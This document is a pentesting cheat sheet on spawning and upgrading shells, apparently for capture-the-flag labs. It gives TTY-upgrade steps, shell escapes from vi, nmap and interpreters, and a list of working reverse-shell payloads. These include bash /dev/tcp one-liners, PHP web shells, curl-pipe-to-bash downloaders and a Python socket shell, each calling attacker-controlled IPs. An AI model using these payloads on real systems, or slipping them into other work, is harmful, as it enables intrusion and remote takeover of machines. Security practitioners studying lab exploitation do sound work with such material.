---
icon: book-skull
---

# Shells/TTYs

{% hint style="info" %}
## <mark style="color:purple;">`TTYs`</mark>

### <mark style="color:purple;">Ncat</mark>

* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enables line editing and history.</mark>
* <mark style="color:purple;">In order to have a full</mark> <mark style="color:orange;">**`TTY`**</mark> <mark style="color:purple;">**follow this steps:**</mark>

#### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>

1. <mark style="color:purple;">`python3 -c 'import pty; pty.spawn("/bin/bash")'`</mark>
2. &#x20;<mark style="color:purple;">`CTRL+Z`</mark>
3. <mark style="color:purple;">`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`</mark>

<mark style="color:orange;">**`ZSH`**</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Same first two steps and then:</mark>

{% code overflow="wrap" %}
```bash
stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}
{% endhint %}











TTYs

```bash
#Spawn a terminal 1
python3 -c 'import pty;pty.spawn("/bin/bash")’
```

Spawning Shells

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
python3 -c 'import pty; pty.spawn("/bin/sh")'

script -qc /bin/bash /dev/null

echo os.system('/bin/bash') 
/bin/sh -i 
perl -e 'exec "/bin/sh";' 
perl: exec "/bin/sh"; 
ruby: exec "/bin/sh" 
lua: os.execute('/bin/sh') 
exec "/bin/sh"; 
/bin/bash -i
exec "/bin/sh"                # (From within IRB) 
:!bash                        # (From within vi)
:set shell=/bin/bash:shell    # (From within vi) 
!sh                           # (From within nmap)
```





***



HTTP

```bash
With Url:
<http://10.10.14.14/$>(bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1')
```

PHP

```bash
#For index.php files
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");
?>

#To copy inside a file
echo '<?php system("curl <http://10.10.14.16:443/rev.sh> | bash"); ?>' > hola.php

```

BASH + PHP

```bash
#Create the rev shell first

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.16/443 0>&1

#Copy it in to file with at http server
echo '<?php system("curl <http://10.10.14.16:80/hey> | bash"); ?>'
```

Standard [shell.sh](http://shell.sh)

```c
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```

Python

```bash
#IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#Inside a file
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.10.14.18\\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);" > exploit.py
```
